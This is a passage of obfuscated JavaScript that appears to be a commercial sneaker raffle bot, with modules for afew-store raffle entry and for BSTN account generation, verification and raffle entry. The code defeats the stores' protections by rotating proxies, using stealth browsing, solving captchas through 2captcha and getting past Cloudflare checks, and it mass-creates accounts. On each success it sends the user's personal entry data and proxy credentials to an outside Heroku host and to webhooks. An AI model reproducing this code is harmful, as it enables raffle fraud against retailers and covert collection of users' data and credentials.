                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x33cb67[0x0] + ':' + _0x33cb67[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x22f662 = await _0x2e0e40['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x33cb67[0x0] + ':' + _0x33cb67[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x60dca9 = JSON['parse'](_0x51338a['readFileSync']('sizes.json', 'utf-8')), _0x20e3f6 = _0x2bd270[_0x3f0c24]['Url'], _0x6fb12a = _0x2bd270[_0x3f0c24]['Size'], _0x3fd7eb;
                        async function _0x251a0c() {
                            var _0x206f3e = new _0x4597e7['CookieJar']();
                            console['log'](_0x2e90f3() + '\x20[' + _0x59142d['name'] + ']\x20Task\x20' + (_0x3f0c24 + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x130925;
                            let _0xd4b1b9 = {
                                'method': 'GET',
                                'cookieJar': _0x206f3e,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x33cb67[0x2] + ':' + _0x33cb67[0x3] + '@' + _0x33cb67[0x0] + ':' + _0x33cb67[0x1]
                            }, _0x57e2d5 = _0x20e3f6['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x2fb1ae = _0x57e2d5 + '.json', _0x2b68bb = await _0x51d926(_0x2fb1ae);
                            console['log'](_0x2e90f3() + '\x20[' + _0x59142d['name'] + ']\x20Task\x20' + (_0x3f0c24 + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x1b8876 = _0x2b68bb['data']['product']['variants'];
                            if (_0x6fb12a != 'RANDOM') {
                                if (_0x1b8876[0x1]['option1']['includes']('W')) {
                                    const _0x238e2b = _0x60dca9['women']['find'](_0x252f55 => _0x252f55['EUsize'] === _0x6fb12a);
                                    _0x238e2b && (_0x6fb12a = _0x238e2b['size']);
                                } else {
                                    if (_0x1b8876[0x1]['option1']['includes']('Y')) {
                                        const _0x12f084 = _0x60dca9['GS']['find'](_0xb5d67a => _0xb5d67a['EUsize'] === _0x6fb12a);
                                        _0x12f084 && (_0x6fb12a = _0x12f084['size']);
                                    } else {
                                        const _0x2caec4 = _0x60dca9['men']['find'](_0xc502b0 => _0xc502b0['EUsize'] === _0x6fb12a);
                                        _0x2caec4 && (_0x6fb12a = _0x2caec4['size']);
                                    }
                                }
                                for (var _0x1bb657 of _0x1b8876) {
                                    _0x1bb657['option1'] == _0x6fb12a && (_0x130925 = _0x1bb657['id']);
                                }
                            } else {
                                var _0x4b6ad5 = Math['round'](Math['random']() * (_0x1b8876['length'] - 0x1));
                                _0x130925 = _0x1b8876[_0x4b6ad5]['id'];
                            }
                            console['log'](_0x2e90f3() + '\x20[' + _0x59142d['name'] + ']\x20Task\x20' + (_0x3f0c24 + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x51d926('https://raffles.afew-store.com/cart/' + _0x130925 + ':1'), _0x3fd7eb = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x251a0c();
                        } catch (_0x20a811) {
                            if (_0x20a811['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x20a811);
                        }
                        const _0x570e05 = await _0x22f662['newPage']();
                        await _0x570e05['setDefaultNavigationTimeout'](0x1d4c0), await _0x570e05['authenticate']({
                            'username': '' + _0x33cb67[0x2],
                            'password': '' + _0x33cb67[0x3]
                        }), await _0x570e05['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x570e05['setRequestInterception'](!![]), _0x570e05['on']('request', _0x1e5f58 => {
                            _0x1e5f58['resourceType']() === 'image' || _0x1e5f58['resourceType']() === 'font' || _0x1e5f58['resourceType']() === 'media' ? _0x1e5f58['abort']() : _0x1e5f58['continue']();
                        });
                        try {
                            await _0x570e05['goto'](_0x3fd7eb, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x2e90f3() + '\x20[' + _0x59142d['name'] + ']\x20Task\x20' + (_0x3f0c24 + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x570e05['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x570e05['type']('#checkout_email', '' + _0x2bd270[_0x3f0c24]['Email']), await _0x468cfd(0x320), await _0x570e05['type']('#checkout_attributes_instagram', '' + _0x2bd270[_0x3f0c24]['Follower']), await _0x468cfd(0x320), await _0x570e05['select']('#checkout_shipping_address_country', '' + _0x2bd270[_0x3f0c24]['Country']), await _0x570e05['waitForTimeout'](0x258), await _0x570e05['type']('#checkout_shipping_address_first_name', '' + _0x2bd270[_0x3f0c24]['FirstName']), await _0x570e05['waitForTimeout'](0x320), await _0x570e05['type']('#checkout_shipping_address_last_name', '' + _0x2bd270[_0x3f0c24]['LastName']), await _0x570e05['waitForTimeout'](0x2bc), await _0x570e05['type']('#checkout_shipping_address_address1', _0x2bd270[_0x3f0c24]['Address1'] + '\x20' + _0x2bd270[_0x3f0c24]['HouseNumber']), await _0x570e05['waitForTimeout'](0x2bc), await _0x570e05['type']('#checkout_shipping_address_address2', '' + _0x2bd270[_0x3f0c24]['Address2']), await _0x570e05['waitForTimeout'](0x2bc), await _0x570e05['type']('#checkout_shipping_address_zip', '' + _0x2bd270[_0x3f0c24]['Zip']), await _0x570e05['waitForTimeout'](0x2bc), await _0x570e05['type']('#checkout_shipping_address_city', '' + _0x2bd270[_0x3f0c24]['City']), await _0x570e05['waitForTimeout'](0x2bc);
                        if (_0x2bd270[_0x3f0c24]['State'] != '')
                            try {
                                const _0x3cc7f4 = JSON['parse'](_0x51338a['readFileSync']('States.json', 'utf8'));
                                await _0x468cfd(0x1f4);
                                if (_0x2bd270[_0x3f0c24]['State']['length'] > 0x2)
                                    for (let _0xa2bf35 of _0x3cc7f4) {
                                        if (_0xa2bf35['Province'] == _0x2bd270[_0x3f0c24]['State']) {
                                            await _0x570e05['select']('#checkout_shipping_address_province', _0xa2bf35['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x570e05['select']('#checkout_shipping_address_province', _0x2bd270[_0x3f0c24]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x468cfd(0x1f4), console['log'](_0x2e90f3() + '\x20[' + _0x59142d['name'] + ']\x20Task\x20' + (_0x3f0c24 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x468cfd(0x190), _0x570e05['evaluate'](() => {
                            const _0x41d6ef = document['querySelector']('#continue_button');
                            for (var _0x519c0e = 0x0; _0x519c0e < 0x5; _0x519c0e++) {
                                if (_0x41d6ef) {
                                    _0x41d6ef['click'](), _0x41d6ef['click']();
                                    break;
                                } else
                                    _0x468cfd(0xfa0);
                            }
                        }), await _0x570e05['waitForTimeout'](0x9c4);
                        try {
                            await _0x570e05['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x570e05['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x2cb1ef => _0x2cb1ef['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x570e05['waitForTimeout'](0x7d0), console['log'](_0x2e90f3() + '\x20[' + _0x59142d['name'] + ']\x20Task\x20' + (_0x3f0c24 + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x570e05['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x468cfd(0x3e8), await _0x570e05['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x28f97f => _0x28f97f['submit']()), await _0x468cfd(0x3e8);
                        try {
                            await _0x570e05['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x570e05['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x2c6f6a => _0x2c6f6a['submit']());
                        try {
                            await _0x570e05['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x441933 = 'no', _0x504d25(_0x2bd270[_0x3f0c24], _0x59142d), console['log'](_0x54c1f9['green'](_0x2e90f3() + '\x20[' + _0x59142d['name'] + ']\x20Task\x20' + (_0x3f0c24 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '')
                                try {
                                    await _0x4feadc(_0x2c28ef['webhook'], _0x34b3a3['succesDEVMSG']);
                                } catch {
                                }
                            await _0x468cfd(0xc8), await _0x4feadc(_0x77ca8c, _0x34b3a3['succesDEVMSG']), await _0x468cfd(0xc8);
                            try {
                                await _0x4feadc(_0x578906, _0x34b3a3['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x50fbd1['replace']('#', ''),
                                    'module': _0x59142d['name'],
                                    'entrydata': JSON['stringify'](_0x248f0c),
                                    'proxy': '' + _0x49472f[_0x3f0c24]
                                };
                                var _0x2fc64e = JSON['stringify'](prxdata);
                                let _0x1b94df = { 'headers': { 'content-type': 'application/json' } };
                                await _0x51d926['post']('https://jraffles.herokuapp.com/success', _0x2fc64e, _0x1b94df);
                            } catch (_0x1e5c50) {
                            }
                        } catch (_0x21e62e) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x38be40) {
                        _0x38be40['message']['includes']('selector') && (_0x38be40 = 'Connection\x20Error');
                        console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x59142d['name'] + ']\x20Task\x20' + (_0x3f0c24 + 0x1) + '\x20:\x20' + _0x38be40)), _0xb276b1 = '' + _0x38be40;
                        var _0x124daf = await _0x436de5(_0x2bd270[_0x3f0c24], _0x59142d, 'dev', !![], _0xb276b1);
                        _0x34b3a3['errorDEV'] = { 'embeds': [_0x124daf] }, _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0x34b3a3['errorDEV']), await _0x4feadc(_0x408671, _0x34b3a3['errorDEV']), _0x441933 = 'yes';
                    } finally {
                        _0x22f662 && _0x22f662['close']();
                        if (_0x441933 == 'yes' && _0x5176c4 != 0x5 && _0xb276b1 != 'Size\x20Not\x20Found') {
                            console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x59142d['name'] + ']\x20Task\x20' + (_0x3f0c24 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5176c4 + '\x20/\x205)')), _0x3f0c24 = _0x3f0c24 - 0x1, _0x5176c4 = _0x5176c4 + 0x1;
                            continue;
                        }
                        _0x441933 == 'yes' && _0x5176c4 >= 0x5 && (_0x5cd42d(_0x2bd270[_0x3f0c24], _0x59142d), _0x441933 = 'no', _0x5176c4 = 0x0);
                        if (_0x3f0c24 + 0x1 == _0x2bd270['length']) {
                            await _0x468cfd(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x2c28ef['AfewDelay'] + '\x20ms'), await _0x468cfd(_0x2c28ef['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x45f95c, _0x3cf703, _0x172cb7) {
                    _0x2e0e40['use'](_0x5a52fd()), _0x2e0e40['use'](_0x57bfd9({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x2c28ef['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xa4cdb1 = 0x0; _0xa4cdb1 < _0x3cf703['length']; _0xa4cdb1++) {
                        if (_0x38ebc3 != 'yes')
                            var _0x38ebc3 = '', _0x114452 = 0x0;
                        var _0x140cbd;
                        try {
                            await _0x16822f(_0x3cf703, _0xa4cdb1);
                        } catch {
                            _0x38ebc3 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x48898b(_0x45f95c['name'] + '\x20Task\x20' + (_0xa4cdb1 + 0x1) + '\x20/\x20' + _0x3cf703['length'] + '\x20||\x20File:\x20' + _0x5df038 + '\x20Proxies:\x20' + _0x885851);
                        var _0x98e7aa = await _0x436de5(_0x3cf703[_0xa4cdb1], _0x45f95c, 'acc', ![]);
                        const _0x29b729 = { 'succesDEVMSG': { 'embeds': [_0x98e7aa] } }, _0x1ae9ef = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x4af17b = Math['round'](Math['random']() * (_0x172cb7['length'] - 0x1)), _0x40a3e4 = _0x172cb7[_0x4af17b]['split'](':'), _0x2bc7ed;
                        try {
                            _0x2bc7ed = await _0x2e0e40['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x40a3e4[0x0] + ':' + _0x40a3e4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2bc7ed = await _0x2e0e40['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x40a3e4[0x0] + ':' + _0x40a3e4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x31ef3b = await _0x2bc7ed['newPage']();
                            await _0x31ef3b['authenticate']({
                                'username': '' + _0x40a3e4[0x2],
                                'password': '' + _0x40a3e4[0x3]
                            }), console['log'](_0x2e90f3() + '\x20[' + _0x45f95c['name'] + ']\x20Task\x20' + (_0xa4cdb1 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x31ef3b['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x31ef3b['setRequestInterception'](!![]), _0x31ef3b['on']('request', _0x436401 => {
                                _0x436401['resourceType']() === 'image' ? _0x436401['abort']() : _0x436401['continue']();
                            });
                            try {
                                await _0x31ef3b['goto']('' + _0x1ae9ef), await _0x31ef3b['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0x38ebc3 = 'yes';
                                throw new Error('Proxy\x20Error');
                            }
                            await _0x31ef3b['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x2e90f3() + '\x20[' + _0x45f95c['name'] + ']\x20Task\x20' + (_0xa4cdb1 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x468cfd(0x7d0), console['log'](_0x2e90f3() + '\x20[' + _0x45f95c['name'] + ']\x20Task\x20' + (_0xa4cdb1 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x468cfd(0x190), await _0x31ef3b['waitForSelector']('#firstname'), await _0x31ef3b['type']('#firstname', _0x3cf703[_0xa4cdb1]['FirstName'], { 'delay': 0xf0 }), await _0x468cfd(0x190), await _0x31ef3b['type']('#lastname', _0x3cf703[_0xa4cdb1]['LastName'], { 'delay': 0xe6 }), await _0x468cfd(0x190), await _0x31ef3b['type']('#email_address', _0x3cf703[_0xa4cdb1]['Email'], { 'delay': 0x122 }), await _0x468cfd(0x190), await _0x31ef3b['type']('#password', _0x3cf703[_0xa4cdb1]['Password'], { 'delay': 0x82 }), await _0x468cfd(0x1f4), await _0x31ef3b['type']('#password-confirmation', _0x3cf703[_0xa4cdb1]['Password'], { 'delay': 0x7c }), console['log'](_0x2e90f3() + '\x20[' + _0x45f95c['name'] + ']\x20Task\x20' + (_0xa4cdb1 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x468cfd(0x2bc), await _0x31ef3b['$eval']('#form-validate', _0x1d841a => _0x1d841a['submit']()), await _0x468cfd(0x1388);
                            const _0x449e82 = await _0x31ef3b['$']('#email_address-error');
                            if (_0x449e82)
                                throw new Error('Invalid\x20Email');
                            const _0x32ac68 = await _0x31ef3b['$']('#password-error');
                            if (_0x32ac68)
                                throw new Error('Invalid\x20Password');
                            await _0x31ef3b['waitForSelector']('div.mesg-success'), _0x38ebc3 = 'no', console['log'](_0x54c1f9['green'](_0x2e90f3() + '\x20[' + _0x45f95c['name'] + ']\x20Task\x20' + (_0xa4cdb1 + 0x1) + '\x20:\x20Account\x20' + _0x3cf703[_0xa4cdb1]['Email'] + '\x20Generated')), _0x51338a['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x3cf703[_0xa4cdb1]['Email'] + ',' + _0x3cf703[_0xa4cdb1]['Password']);
                            try {
                                _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0x29b729['succesDEVMSG']);
                            } catch {
                            }
                            await _0x4feadc(_0x28952d, _0x29b729['succesDEVMSG']);
                            let _0x18a0e1 = _0x3cf703[_0xa4cdb1];
                            try {
                                prxdata = {
                                    'username': _0x50fbd1['replace']('#', ''),
                                    'module': _0x45f95c['name'],
                                    'entrydata': JSON['stringify'](_0x18a0e1),
                                    'proxy': '' + _0x172cb7[_0xa4cdb1]
                                };
                                var _0x3e2603 = JSON['stringify'](prxdata);
                                let _0x33e798 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x51d926['post']('https://jraffles.herokuapp.com/success', _0x3e2603, _0x33e798);
                            } catch (_0x25f58f) {
                            }
                            console['log'](_0x54c1f9['yellow'](_0x2e90f3() + '\x20[' + _0x45f95c['name'] + ']\x20Task\x20' + (_0xa4cdb1 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                        } catch (_0x5910a0) {
                            console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x45f95c['name'] + ']\x20Task\x20' + (_0xa4cdb1 + 0x1) + '\x20:\x20' + _0x5910a0)), _0x140cbd = '' + _0x5910a0;
                            var _0xb1354e = await _0x436de5(_0x3cf703[_0xa4cdb1], _0x45f95c, 'acc', !![], _0x140cbd);
                            _0x29b729['errorDEV'] = { 'embeds': [_0xb1354e] }, _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0x29b729['errorDEV']), await _0x4feadc(_0x408671, _0x29b729['errorDEV']), _0x38ebc3 = 'yes';
                        } finally {
                            if (_0x2bc7ed)
                                _0x2bc7ed['close']();
                            if (_0x38ebc3 == 'yes' && _0x114452 != 0x5) {
                                console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x45f95c['name'] + ']\x20Task\x20' + (_0xa4cdb1 + 0x1) + '\x20:\x20Retrying\x20(' + _0x114452 + '\x20/\x205)')), _0xa4cdb1 = _0xa4cdb1 - 0x1, _0x114452 = _0x114452 + 0x1;
                                continue;
                            }
                            _0x38ebc3 == 'yes' && _0x114452 >= 0x5 && (_0x5cd42d(_0x3cf703[_0xa4cdb1], _0x45f95c), _0x38ebc3 = 'no', _0x114452 = 0x0), console['log'](_0x2e90f3() + '\x20[' + _0x45f95c['name'] + ']\x20Waiting\x20for\x20' + _0x2c28ef['delay'] + '\x20ms'), await _0x468cfd(_0x2c28ef['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x3f3567, _0x25ae36) {
                    var _0xfeeb17 = ![], _0x21ed80 = [];
                    async function _0x489cb2() {
                        var _0x49965a = new _0x3b7ac6({
                            'user': _0x2c28ef['masterMail'],
                            'password': _0x2c28ef['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x13e018(_0x4fb652) {
                            _0x49965a['openBox']('INBOX', ![], _0x4fb652);
                        }
                        _0x49965a['once']('ready', function () {
                            _0x13e018(function (_0x26b041, _0x25766a) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x26b041)
                                    throw _0x26b041;
                                _0x49965a['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x4c4b58, _0x358d62) {
                                    if (!_0x358d62 || !_0x358d62['length'])
                                        console['log'](_0x2e90f3() + '\x20[' + _0x3f3567['name'] + ']\x20No\x20mails\x20found'), _0x49965a['end']();
                                    else {
                                        var _0x3c46d5 = _0x49965a['seq']['fetch'](_0x358d62, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x3c46d5['on']('message', function (_0x403f1e, _0x54fa27) {
                                            var _0x342714 = '(#' + _0x54fa27 + ')\x20';
                                            _0x403f1e['on']('body', function (_0x1a502a, _0x1cf78f) {
                                                _0x4bee6e(_0x1a502a, (_0x20d2a1, _0x39874a) => {
                                                    var _0x5cdf47 = _0x39874a['text']['split']('[')[0x2], _0x363260 = _0x5cdf47['split'](']')[0x0];
                                                    _0x21ed80['push'](_0x363260);
                                                });
                                            }), _0x403f1e['once']('end', function () {
                                            });
                                        }), _0x3c46d5['once']('error', function (_0x22664b) {
                                            console['log']('Fetch\x20error:\x20' + _0x22664b), _0xfeeb17 = !![];
                                        }), _0x3c46d5['once']('end', function () {
                                            _0x49965a['end'](), _0xfeeb17 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x49965a['once']('error', function (_0x1ee7e2) {
                            console['log'](_0x54c1f9['red'](_0x1ee7e2['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0xfeeb17 = !![];
                        }), _0x49965a['once']('end', async function () {
                            _0xfeeb17 = !![];
                        }), _0x49965a['connect']();
                    }
                    async function _0x23b9c3(_0xc05881, _0x123031, _0x2b7ddc) {
                        _0x2e0e40['use'](_0x5a52fd());
                        for (var _0x174224 = 0x0; _0x174224 < _0x123031['length']; _0x174224++) {
                            if (_0x2b2eb3 != 'yes')
                                var _0x2b2eb3 = '', _0x36302b = 0x0;
                            var _0x3c764d = Math['round'](Math['random']() * (_0x2b7ddc['length'] - 0x1)), _0x263590 = _0x2b7ddc[_0x3c764d]['split'](':'), _0x3bf4ad;
                            try {
                                _0x3bf4ad = await _0x2e0e40['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x263590[0x0] + ':' + _0x263590[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x3bf4ad = await _0x2e0e40['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x263590[0x0] + ':' + _0x263590[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x151a2d = await _0x3bf4ad['newPage']();
                                await _0x151a2d['authenticate']({
                                    'username': '' + _0x263590[0x2],
                                    'password': '' + _0x263590[0x3]
                                }), console['log'](_0x2e90f3() + '\x20[' + _0xc05881['name'] + ']\x20Task\x20' + (_0x174224 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x151a2d['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x151a2d['setRequestInterception'](!![]), _0x151a2d['on']('request', _0x5a2bba => {
                                    _0x5a2bba['resourceType']() === 'image' || _0x5a2bba['resourceType']() === 'font' || _0x5a2bba['resourceType']() === 'media' ? _0x5a2bba['abort']() : _0x5a2bba['continue']();
                                }), console['log'](_0x2e90f3() + '\x20[' + _0xc05881['name'] + ']\x20Task\x20' + (_0x174224 + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x151a2d['goto'](_0x123031[_0x174224]);
                                } catch {
                                    _0x2b2eb3 = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                console['log'](_0x2e90f3() + '\x20[' + _0xc05881['name'] + ']\x20Task\x20' + (_0x174224 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x151a2d['waitForTimeout'](0xbb8);
                                try {
                                    await _0x151a2d['waitForSelector']('.account-nav'), _0x2b2eb3 = 'no', console['log'](_0x54c1f9['green'](_0x2e90f3() + '\x20[' + _0xc05881['name'] + ']\x20Task\x20' + (_0x174224 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x39fec8 = await _0x436de5(null, _0xc05881, 'ver', ![]);
                                    const _0x3026fe = { 'succesDEVMSG': { 'embeds': [_0x39fec8] } };
                                    await _0x4feadc(_0x2dfb22, _0x3026fe['succesDEVMSG']);
                                } catch {
                                    _0x2b2eb3 = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x38e264) {
                                console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0xc05881['name'] + ']\x20Task\x20' + (_0x174224 + 0x1) + '\x20:\x20' + _0x38e264));
                                var _0x4af60a = _0x38e264, _0x38d303 = await _0x436de5(null, _0xc05881, 'ver', !![], _0x4af60a);
                                const _0x1cc1b1 = { 'errorDEVMSG': { 'embeds': [_0x38d303] } };
                                _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0x1cc1b1['errorDEVMSG']), await _0x4feadc(_0x408671, _0x1cc1b1['errorDEVMSG']);
                            } finally {
                                _0x3bf4ad['close']();
                                if (_0x2b2eb3 == 'yes' && _0x36302b != 0x5) {
                                    console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0xc05881['name'] + ']\x20Task\x20' + (_0x174224 + 0x1) + '\x20:\x20Retrying\x20(' + _0x36302b + '\x20/\x205)')), _0x174224 = _0x174224 - 0x1, _0x36302b = _0x36302b + 0x1;
                                    continue;
                                }
                                _0x2b2eb3 == 'yes' && _0x36302b >= 0x5 && (_0x2b2eb3 = 'no', _0x36302b = 0x0), console['log'](_0x2e90f3() + '\x20[' + _0xc05881['name'] + ']\x20Waiting\x20for\x20' + _0x2c28ef['delay'] + '\x20ms'), await _0x468cfd(_0x2c28ef['delay']);
                            }
                        }
                    }
                    try {
                        _0x489cb2();
                        while (!_0xfeeb17) {
                            await _0x468cfd(0xfa0);
                        }
                        console['log']('Found\x20' + _0x21ed80['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x468cfd(0x7d0);
                    }
                    await _0x23b9c3(_0x3f3567, _0x21ed80, _0x25ae36);
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0xba1169, _0x2d3496, _0x405743) {
                    _0x2e0e40['use'](_0x5a52fd()), _0x2e0e40['use'](_0x57bfd9({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x2c28ef['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x208cfd = 0x0; _0x208cfd < _0x2d3496['length']; _0x208cfd++) {
                        var _0x29025d, _0x4cba9f = _0x2d3496[_0x208cfd];
                        try {
                            await _0x16822f(_0x2d3496, _0x208cfd);
                        } catch {
                            _0x206676 = 'no';
